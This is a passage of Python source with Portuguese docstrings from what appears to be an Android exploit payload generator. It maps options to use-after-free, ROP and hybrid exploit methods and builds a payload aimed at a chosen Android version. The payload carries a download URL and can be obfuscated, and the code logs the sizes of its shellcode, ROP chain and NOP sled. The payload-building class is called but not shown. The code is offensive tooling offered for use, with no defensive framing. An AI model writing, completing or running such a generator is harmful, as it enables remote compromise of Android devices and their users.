            method_str: String do método (ex: "uaf", "rop")
            
        Returns:
            ExploitMethod: Enum correspondente
        """
        
        method_map = {
            "uaf": ExploitMethod.UAF,
            "rop": ExploitMethod.ROP,
            "hybrid": ExploitMethod.HYBRID,
        }
        
        return method_map.get(method_str, ExploitMethod.UAF)
    
    def generate_payload(self, url: str, android_version: str, method: str, obfuscate: bool) -> bytes:
        """
        Gera o payload.
        
        Args:
            url: URL do servidor
            android_version: Versão do Android
            method: Método de exploração
            obfuscate: Se deve ofuscar
            
        Returns:
            bytes: Payload gerado
        """
        
        self.logger.info(f"Gerando payload para Android {android_version}...")
        
        target_version = self.map_android_version(android_version)
        exploit_method = self.map_exploit_method(method)
        
        self.payload_generator = PayloadGenerator(
            target_version=target_version,
            download_url=url,
            exploit_method=exploit_method,
            obfuscate=obfuscate
        )
        
        payload = self.payload_generator.get_complete_payload()
        
        info = self.payload_generator.get_payload_info()
        self.logger.success(f"Payload gerado: {info['payload_size']} bytes")
        
        if self.logger.debug:
            self.logger.debug(f"Shellcode: {info['shellcode_size']} bytes")
            self.logger.debug(f"ROP Chain: {info['rop_chain_size']} bytes")
            self.logger.debug(f"NOP Sled: {info['nop_sled_size']} bytes")
        